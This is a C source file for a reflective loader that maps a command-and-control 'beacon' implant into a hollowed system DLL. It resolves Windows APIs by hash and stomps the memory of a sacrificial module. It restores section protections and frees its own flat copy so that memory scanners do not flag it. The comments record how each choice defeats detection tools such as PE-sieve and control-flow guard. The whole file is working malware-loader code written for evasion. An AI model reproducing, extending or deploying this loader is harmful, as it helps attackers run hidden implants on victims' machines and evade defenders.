/* Phase 4: image-backed reflective loader (UDRL, AceLdr lineage).
 *
 * Contract (reverse-engineered from 4.9.1, docs/EVASION-ROADMAP.md section 14):
 *   - compiled to a COFF object; the client's extract_reflective_loader takes
 *     the FIRST executable section's raw bytes (OBJParser.hasSection(".text")
 *     else the last IMAGE_SCN_MEM_EXECUTE section) and setup_reflective_loader
 *     writes them at the beacon DLL's ReflectiveLoader export (our 5KB INT3
 *     wall). The DOS header is then patched to jump to that export. Therefore
 *     byte 0 of the extracted section IS the runtime entry - it MUST be
 *     ReflectiveLoader, not a static helper. Helpers are __forceinline and
 *     the export lives in .text$aaa so it sorts first.
 *   - at runtime the artifact container holds the patched DLL as a FLAT FILE
 *     copy in memory and calls this export with rcx = that flat copy. The
 *     loader maps the beacon image into a sacrificial module, calls
 *     DllMain(base, DLL_METASPLOIT_ATTACH(4), lpParameter) and NEVER returns
 *     (our DllMain starts the beacon loop on reason 4, not PROCESS_ATTACH).
 *
 * COFF self-containment (OBJExecutableSimple rejects anything else):
 *   - NO string literals (.rdata relocs) - wide names are stack QWORDs, API
 *     names are found by ROR13 hash
 *   - NO CRT - __stosb/__movsb, never memset/memcpy-shaped loops
 *   - NO direct Win32 calls - everything resolved by hash from kernel32
 *
 * Image-backed mapping (AceLdr lineage), not unbacked RWX:
 *   1. PEB-walk kernel32; hash-resolve the APIs
 *   2. LoadLibraryExW a sacrificial system DLL (DONT_RESOLVE_DLL_REFERENCES)
 *   3. RW the sacrificial .text, copy the beacon at natural RVAs
 *   4. reloc + IAT, restore per-section protections
 *   5. DllMain(sc_base, 4, lpParameter) - never returns
 */

#include <windows.h>
#include <intrin.h>

typedef unsigned long long BW_QWORD;
#define QWORD BW_QWORD

#pragma pack(push, 1)

typedef struct {
    WORD  Magic;
    BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    QWORD ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion;
    WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD  Subsystem;
    WORD  DllCharacteristics;
    QWORD SizeOfStackReserve;
    QWORD SizeOfStackCommit;
    QWORD SizeOfHeapReserve;
    QWORD SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
} IMG_OPT64;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMG_SECTION;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_DIR_ENTRY;

typedef struct {
    DWORD OriginalFirstThunk;
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} IMG_IMPORT;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_BASE_RELOC;

typedef struct {
    WORD  PageOffset : 12;
    WORD  Type : 4;
} IMG_RELOC_ENTRY;

#pragma pack(pop)

#define IMG_DIRECTORY_IMPORT   1
#define IMAGE_REL_BASED_DIR64  10

#define BW_H_LOADLIBRARYA  0xEC0E4E8EUL
#define BW_H_GETPROCADDR   0x7C0DFCAAUL
#define BW_H_VIRTUALPROT   0x7946C61BUL
#define BW_H_VIRTUALQUERY  0xA3C8C8AAUL
#define BW_H_LOADLIBEXW    0x0753A512UL
#define BW_H_FREELIBRARY   0x4DC9D5A0UL
#define BW_H_EXITTHREAD    0x60E0CEEFUL
#define BW_H_FLUSHICACHE   0x53120980UL
#define BW_H_GETCURPROC    0x7B8F17E6UL

typedef HMODULE (WINAPI *BW_LOADLIBA)(LPCSTR);
typedef FARPROC (WINAPI *BW_GETPROC)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *BW_VPROT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef SIZE_T  (WINAPI *BW_VQUERY)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef HMODULE (WINAPI *BW_LOADLIBEXW)(LPCWSTR, HANDLE, DWORD);
typedef BOOL    (WINAPI *BW_FREELIB)(HMODULE);
typedef VOID    (WINAPI *BW_EXITTHR)(DWORD);
typedef BOOL    (WINAPI *BW_FLUSH)(HANDLE, LPCVOID, SIZE_T);
typedef HANDLE  (WINAPI *BW_GETCUR)(void);
typedef BOOL    (WINAPI *BW_DLLMAIN)(void *, DWORD, void *);

static __forceinline void * bw_zero(void * dst, SIZE_T n) {
    __stosb((unsigned char *)dst, 0, n);
    return dst;
}

static __forceinline void * bw_copy(void * dst, const void * src, SIZE_T n) {
    __movsb((unsigned char *)dst, (const unsigned char *)src, n);
    return dst;
}

static __forceinline int bw_wieq(const unsigned short * a, const unsigned short * b) {
    while (*a && *b) {
        unsigned short ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static __forceinline unsigned long bw_hash(const char * s) {
    unsigned long h = 0;
    while (*s) {
        h = (h >> 13) | (h << 19);
        h += (unsigned char)*s++;
    }
    return h;
}

static __forceinline void * bw_peb_ldr_list(void) {
    unsigned long long peb = __readgsqword(0x60);
    unsigned long long ldr = *(unsigned long long *)(peb + 0x18);
    return (void *)(ldr + 0x10);
}

static __forceinline void * bw_find_module(const unsigned short * want) {
    void * head = bw_peb_ldr_list();
    void * cur = *(void **)head;
    while (cur != head) {
        void * base = *(void **)((unsigned char *)cur + 0x30);
        unsigned short * name = *(unsigned short **)((unsigned char *)cur + 0x60);
        if (base != NULL && name != NULL && bw_wieq(name, want))
            return base;
        cur = *(void **)cur;
    }
    return 0;
}

/* IMAGE_EXPORT_DIRECTORY:
 *   +0x14 NumberOfFunctions
 *   +0x18 NumberOfNames
 *   +0x1C AddressOfFunctions   <- the RVA array, NOT +0x14
 *   +0x20 AddressOfNames
 *   +0x24 AddressOfNameOrdinals
 * A first-cut bug treated +0x14 as AddressOfFunctions, so every "resolved"
 * API was kernel32+NumberOfFunctions (the DOS stub). */
static __forceinline void * bw_find_export_hash(void * base, unsigned long want) {
    unsigned char * b = (unsigned char *)base;
    DWORD e_lfanew = *(DWORD *)(b + 0x3C);
    unsigned char * nth = b + e_lfanew;
    DWORD exp_rva = *(DWORD *)(nth + 0x88); /* opt+0x70 = DataDirectory[0] */
    DWORD exp_sz;
    unsigned char * ed;
    DWORD * names;
    WORD * ords;
    DWORD * funcs;
    DWORD nnames, i;

    if (exp_rva == 0)
        return NULL;
    exp_sz = *(DWORD *)(nth + 0x8C);
    ed = b + exp_rva;
    nnames = *(DWORD *)(ed + 0x18);
    funcs = (DWORD *)(b + *(DWORD *)(ed + 0x1C));
    names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
    ords  = (WORD  *)(b + *(DWORD *)(ed + 0x24));
    for (i = 0; i < nnames; i++) {
        char * nm = (char *)(b + names[i]);
        if (bw_hash(nm) == want) {
            DWORD frva = funcs[ords[i]];
            /* forwarder: RVA falls inside the export directory */
            if (frva >= exp_rva && frva < exp_rva + exp_sz)
                return NULL;
            return b + frva;
        }
    }
    return NULL;
}

static __forceinline int bw_process_reloc(unsigned char * image, DWORD size_of_image) {
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * rel = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + 5 * sizeof(IMG_DIR_ENTRY));
    IMG_BASE_RELOC * block;
    IMG_BASE_RELOC * end;
    QWORD delta;
    DWORD i;

    if (rel->VirtualAddress == 0 || rel->Size == 0)
        return 1;
    if (opt->ImageBase == (QWORD)(DWORD_PTR)image)
        return 1;

    delta = (QWORD)(DWORD_PTR)image - opt->ImageBase;
    block = (IMG_BASE_RELOC *)(image + rel->VirtualAddress);
    end = (IMG_BASE_RELOC *)((unsigned char *)block + rel->Size);

    while (block < end && block->Size > 0) {
        IMG_RELOC_ENTRY * entries = (IMG_RELOC_ENTRY *)((unsigned char *)block + sizeof(IMG_BASE_RELOC));
        DWORD count = (block->Size - sizeof(IMG_BASE_RELOC)) / sizeof(IMG_RELOC_ENTRY);
        DWORD page = block->VirtualAddress;
        for (i = 0; i < count; i++) {
            if (entries[i].Type == IMAGE_REL_BASED_DIR64) {
                QWORD * p = (QWORD *)(image + page + entries[i].PageOffset);
                if ((QWORD)(DWORD_PTR)p < (QWORD)(DWORD_PTR)image + size_of_image)
                    *p += delta;
            }
        }
        block = (IMG_BASE_RELOC *)((unsigned char *)block + block->Size);
    }
    return 1;
}

static __forceinline int bw_fill_iat(unsigned char * image, BW_LOADLIBA pLoadLibraryA, BW_GETPROC pGetProcAddress) {
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * imp = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + IMG_DIRECTORY_IMPORT * sizeof(IMG_DIR_ENTRY));
    IMG_IMPORT * desc;
    IMG_IMPORT * desc_end;

    if (imp->VirtualAddress == 0)
        return 1;
    desc = (IMG_IMPORT *)(image + imp->VirtualAddress);
    desc_end = (IMG_IMPORT *)((unsigned char *)desc + imp->Size);

    for (; desc < desc_end && desc->Name != 0; desc++) {
        char * dllname = (char *)(image + desc->Name);
        HMODULE hmod = pLoadLibraryA(dllname);
        QWORD * lookup;
        QWORD * thunk;

        if (hmod == NULL)
            return 0;
        lookup = (QWORD *)(image + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
        thunk  = (QWORD *)(image + desc->FirstThunk);
        for (; *lookup; lookup++, thunk++) {
            QWORD v = *lookup;
            FARPROC fn;
            if (v >> 63)
                fn = pGetProcAddress(hmod, (LPCSTR)(v & 0xFFFF));
            else
                fn = pGetProcAddress(hmod, (LPCSTR)(image + v + 2));
            if (fn == NULL)
                return 0;
            *thunk = (QWORD)(DWORD_PTR)fn;
        }
    }
    return 1;
}

/* Force this body into .text$aaa so it is the first executable section the
 * client's extractor will pick (alphabetical $ suffix, and the only one we
 * emit if the helpers actually inline). */
#pragma code_seg(".text$aaa")

__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{
    unsigned char * flat;
    unsigned long long kern;
    BW_LOADLIBA    pLoadLibraryA;
    BW_GETPROC     pGetProcAddress;
    BW_VPROT       pVP;
    BW_VQUERY      pVQ;
    BW_LOADLIBEXW  pLLW;
    BW_FREELIB     pFL;
    BW_EXITTHR     pET;
    BW_FLUSH       pFlush;
    BW_GETCUR      pGetCur;
    unsigned char * nth;
    IMG_OPT64 * opt;
    IMG_SECTION * sec;
    DWORD nsec, szopt, i, j;
    DWORD size_of_image;
    unsigned char * sc_base = NULL;
    SIZE_T sc_span = 0;
    int k;
    BW_DLLMAIN dllmain;

    /* Resolve kernel32 + VirtualQuery FIRST: the location block below
     * calls pVQ, and reading it before assignment reads an uninitialized
     * stack slot (1fe0665 booted-and-died exactly this way - the != NULL
     * guard is worthless against garbage). Nothing before the PE parse
     * needs `flat`, so the walk order is free to change. */
    {
        unsigned short kname[16];
        QWORD * kq = (QWORD *)kname;
        kq[0] = 0x006E00720065006BULL;
        kq[1] = 0x00320033006C0065ULL;
        kq[2] = 0x006C006C0064002EULL;
        kq[3] = 0x0000000000000000ULL;
        kern = (unsigned long long)bw_find_module(kname);
    }
    if (kern == 0)
        return 0;

    pVQ             = (BW_VQUERY)    bw_find_export_hash((void *)kern, BW_H_VIRTUALQUERY);
    if (pVQ == NULL)
        return 0;

    /* this function runs FROM the wall (.text). Locate the image that owns
     * us: every real execution context (injectors, sRDI-style hosts, our
     * append-template) copies the flat image into its own VirtualAlloc and
     * calls into it, so the region's AllocationBase IS the image base -
     * magic-agnostic and one syscall. Use it first.
     *
     * magic_mz_x64/magic_pe caveat, why the header scan is only a FALLBACK:
     * a magic-patched image has no MZ/PE anywhere, so the old scan-first
     * order walked 4096 pages DOWN - 16MB below a fresh VirtualAlloc is
     * routinely unmapped, and the probe read faults before the fallback
     * ever ran. The scan still covers exotic in-place contexts, but only
     * after VirtualQuery has failed. */
    {
        QWORD pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
        MEMORY_BASIC_INFORMATION mbi;
        flat = NULL;
        if (pVQ((LPCVOID)(pc & ~0xFFFULL), &mbi, sizeof(mbi)) != 0
            && mbi.AllocationBase != NULL)
            flat = (unsigned char *)mbi.AllocationBase;
        if (flat == NULL) {
            for (j = 0; j < 4096; j++) {
                unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
                if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
                    DWORD lf = *(DWORD *)(page + 0x3C);
                    if (lf < 0x1000 && *(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
                        flat = page;
                        break;
                    }
                }
            }
        }
        if (flat == NULL)
            return 0;
    }

    nth = flat + *(DWORD *)(flat + 0x3C);
    opt = (IMG_OPT64 *)(nth + 24);
    nsec = *(WORD *)(nth + 6);
    szopt = *(WORD *)(nth + 20);
    sec = (IMG_SECTION *)(nth + 24 + szopt);
    size_of_image = opt->SizeOfImage;

    pLoadLibraryA   = (BW_LOADLIBA)  bw_find_export_hash((void *)kern, BW_H_LOADLIBRARYA);
    pGetProcAddress = (BW_GETPROC)   bw_find_export_hash((void *)kern, BW_H_GETPROCADDR);
    pVP             = (BW_VPROT)     bw_find_export_hash((void *)kern, BW_H_VIRTUALPROT);
    pLLW            = (BW_LOADLIBEXW)bw_find_export_hash((void *)kern, BW_H_LOADLIBEXW);
    pFL             = (BW_FREELIB)   bw_find_export_hash((void *)kern, BW_H_FREELIBRARY);
    pET             = (BW_EXITTHR)   bw_find_export_hash((void *)kern, BW_H_EXITTHREAD);
    pFlush          = (BW_FLUSH)     bw_find_export_hash((void *)kern, BW_H_FLUSHICACHE);
    pGetCur         = (BW_GETCUR)    bw_find_export_hash((void *)kern, BW_H_GETCURPROC);
    if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL ||
        pLLW == NULL)
        return 0;

    /* Map at the sacrificial HMODULE, not at its .text. RtlPcToFileHeader /
     * PEB walks still report the real module base; if we handed DllMain a
     * .text pointer, every RVA the beacon applies is 0x1000 too high and
     * leftover original code (xpsservices EP at +0x1cf3e0, past our 0x67000
     * overlay) stays PAGE_READWRITE - BEX64 DEP at 0x1d29d8 on the last
     * dump. AceLdr copies the implant at the module base for this reason.
     * Candidates must have SizeOfImage > beacon SizeOfImage. */
    for (k = 0; k < 4; k++) {
        unsigned short wname[28];
        QWORD * wq = (QWORD *)wname;
        unsigned char * cand;
        unsigned char * cand_nth;
        IMG_OPT64 * cand_opt;
        MEMORY_BASIC_INFORMATION mbi;
        HMODULE h;
        DWORD cand_soi;

        wq[0] = 0; wq[1] = 0; wq[2] = 0; wq[3] = 0;
        /* Guard CF (IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000) is fatal
         * here: ntdll still holds the sacrificial module's original CFG
         * bitmap, so the indirect call to our DllMain is rejected and the
         * dispatch lands in leftover original code (BEX64 at
         * xpsservices+0x1cfa89 on the previous dump). Candidates below
         * have SizeOfImage > beacon and dllchar without 0x4000. */
        if (k == 0) {        /* spwizimg.dll     SizeOfImage 0x598000, nocfg */
            wq[0] = 0x0069007700700073ULL; wq[1] = 0x0067006D0069007AULL;
            wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
        } else if (k == 1) { /* shellstyle.dll   SizeOfImage 0x11c000, nocfg */
            wq[0] = 0x006C006500680073ULL; wq[1] = 0x007900740073006CULL;
            wq[2] = 0x0064002E0065006CULL; wq[3] = 0x00000000006C006CULL;
        } else if (k == 2) { /* msvcr100.dll     SizeOfImage 0x0d2000, nocfg */
            wq[0] = 0x006300760073006DULL; wq[1] = 0x0030003000310072ULL;
            wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
        } else {             /* UIRibbonRes.dll  SizeOfImage 0x0ce000, nocfg */
            wq[0] = 0x0069005200490055ULL; wq[1] = 0x006E006F00620062ULL;
            wq[2] = 0x002E007300650052ULL; wq[3] = 0x0000006C006C0064ULL;
        }
        wname[27] = 0;

        h = pLLW(wname, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (h == NULL)
            continue;
        cand = (unsigned char *)h;
        if (cand == flat) {
            if (pFL) pFL(h);
            continue;
        }
        cand_nth = cand + *(DWORD *)(cand + 0x3C);
        if (*(DWORD *)cand_nth != IMAGE_NT_SIGNATURE) {
            if (pFL) pFL(h);
            continue;
        }
        cand_opt = (IMG_OPT64 *)(cand_nth + 24);
        cand_soi = cand_opt->SizeOfImage;
        if (cand_soi < size_of_image) {
            if (pFL) pFL(h);
            continue;
        }
        if (!pVQ(cand, &mbi, sizeof(mbi)) ||
            mbi.State != MEM_COMMIT ||
            mbi.AllocationBase != cand) {
            if (pFL) pFL(h);
            continue;
        }
        sc_base = cand;
        sc_span = cand_soi;
        break;
    }
    if (sc_base == NULL || sc_base == flat)
        return 0;

    /* Flip every committed page covering [base, base+SizeOfImage) to RW.
     * VirtualProtect on a span larger than one region fails silently and
     * leaves the original RX/R/RW mix, so walk with VirtualQuery. */
    {
        unsigned char * p = sc_base;
        unsigned char * end = sc_base + size_of_image;
        while (p < end) {
            MEMORY_BASIC_INFORMATION mbi;
            DWORD oldp = 0;
            SIZE_T chunk;
            if (!pVQ(p, &mbi, sizeof(mbi)))
                return 0;
            chunk = (SIZE_T)((unsigned char *)mbi.BaseAddress + mbi.RegionSize - p);
            if (p + chunk > end)
                chunk = (SIZE_T)(end - p);
            if (!pVP(p, chunk, PAGE_READWRITE, &oldp))
                return 0;
            p += chunk;
        }
    }

    bw_zero(sc_base, size_of_image);
    bw_copy(sc_base, flat, opt->SizeOfHeaders);
    for (i = 0; i < nsec; i++) {
        if (sec[i].SizeOfRawData == 0)
            continue;
        bw_copy(sc_base + sec[i].VirtualAddress,
                flat + sec[i].PointerToRawData,
                sec[i].SizeOfRawData);
    }

    if (!bw_process_reloc(sc_base, size_of_image))
        return 0;
    if (!bw_fill_iat(sc_base, pLoadLibraryA, pGetProcAddress))
        return 0;

    for (i = 0; i < nsec; i++) {
        DWORD prot, oldp = 0, chars = sec[i].Characteristics;
        SIZE_T psz = sec[i].VirtualSize ? sec[i].VirtualSize : sec[i].SizeOfRawData;
        if (chars & 0x20000000)
            prot = PAGE_EXECUTE_READ;
        else if (chars & 0x80000000)
            prot = PAGE_READWRITE;
        else
            prot = PAGE_READONLY;
        pVP(sc_base + sec[i].VirtualAddress, psz, prot, &oldp);
    }
    {
        DWORD oldp = 0;
        pVP(sc_base, opt->SizeOfHeaders, PAGE_READONLY, &oldp);
    }
    /* Anything past the overlay is leftover original code of the
     * sacrificial DLL. Make it NOACCESS so a stray jump cannot execute
     * it (the previous dump's RIP was leftover xpsservices at +0x1cfa89). */
    if (sc_span > size_of_image) {
        unsigned char * p = sc_base + size_of_image;
        unsigned char * end = sc_base + sc_span;
        while (p < end) {
            MEMORY_BASIC_INFORMATION mbi;
            DWORD oldp = 0;
            SIZE_T chunk;
            if (!pVQ(p, &mbi, sizeof(mbi)))
                break;
            chunk = (SIZE_T)((unsigned char *)mbi.BaseAddress + mbi.RegionSize - p);
            if (p + chunk > end)
                chunk = (SIZE_T)(end - p);
            pVP(p, chunk, PAGE_NOACCESS, &oldp);
            p += chunk;
        }
    }

    if (pFlush && pGetCur)
        pFlush(pGetCur(), NULL, 0);

    /* AddressOfEntryPoint is DllMainCRTStartup, not our DllMain. The CRT
     * only creates its heap / runs initializers on DLL_PROCESS_ATTACH; a
     * first call with reason 4 (the previous dump) left the heap handle
     * NULL and ntdll crashed on `cmp [rbx+10h], 0DDEEDDEEh` with rbx=0.
     * Official UDRL does PROCESS_ATTACH inside the loader and returns the
     * EP so the DOS stub can call reason 4; we do both here because our
     * DllMain starts the beacon loop on reason 4 and must not return.
     *
     * Container handoff: reason 4's parameter points at this stack struct
     * (alive for as long as dllmain runs - the loader frame below it on
     * this same thread never unwinds). The beacon frees the container's
     * decode allocation from inside DllMain: by then it executes from
     * sc_base and the loader code in `flat` is dead (the return address
     * into it is never popped), so releasing it leaves no full PE copy of
     * us in memory (the PE-sieve "Implanted PE" finding). The struct
     * carries the ALLOCATION base, not `flat` itself - VirtualFree with
     * MEM_RELEASE needs the base or it silently fails. */
    dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
#if defined(BW_UDRL_USER_DATA_DELIVER)
    /* 4.9 Beacon User Data: deliver a 32-byte custom buffer with reason
     * 0x0d BEFORE the standard PROCESS_ATTACH - the official contract.
     * Layout must mirror beacon USER_DATA_UD byte-for-byte: syscalls is
     * an EMBEDDED {entries ptr, count, pad} struct, NOT a bare pointer -
     * customData lives at offset 24 and sizeof == 56 (the first delivery
     * attempt used a pointer field, put custom at 16, and the handler
     * copied from 24: marker bytes + stack garbage, never contiguous).
     * Four volatile QWORD stores (volatile defeats XMM vectorization into
     * .rdata; the bake carries only .text); values are LITTLE-ENDIAN so
     * the in-memory buffer reads as the marker string.
     * Build with /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
    {
        struct {
            unsigned int length;
            unsigned int version;
            struct { void * entries; unsigned int count; } syscalls;
            char custom[32];
        } ud;
        volatile unsigned long long * dst;
        ud.length = (unsigned int)sizeof(ud);
        ud.version = 1;
        ud.syscalls.entries = NULL;
        ud.syscalls.count = 0;
        dst = (volatile unsigned long long *)ud.custom;
        *dst++ = 0x3332313044553350ULL;
        *dst++ = 0x4241393837363534ULL;
        *dst++ = 0x4A49484746454443ULL;
        *dst++ = 0x5958504F4E4D4C4BULL;
        dllmain((void *)sc_base, 0x0d, &ud);
    }
#endif
    dllmain((void *)sc_base, DLL_PROCESS_ATTACH, lpParameter);
    {
        struct { DWORD magic; void *alloc; } ho;
        MEMORY_BASIC_INFORMATION mbi;
        ho.magic = 0x46435742UL; /* 'BWCF' */
        ho.alloc = (void *)flat;
        if (pVQ(flat, &mbi, sizeof(mbi)) && mbi.AllocationBase != NULL)
            ho.alloc = mbi.AllocationBase;
        dllmain((void *)sc_base, 4, &ho);
    }
    if (pET != NULL)
        pET(0);
    return (ULONG_PTR)(DWORD_PTR)sc_base;
}

#pragma code_seg()
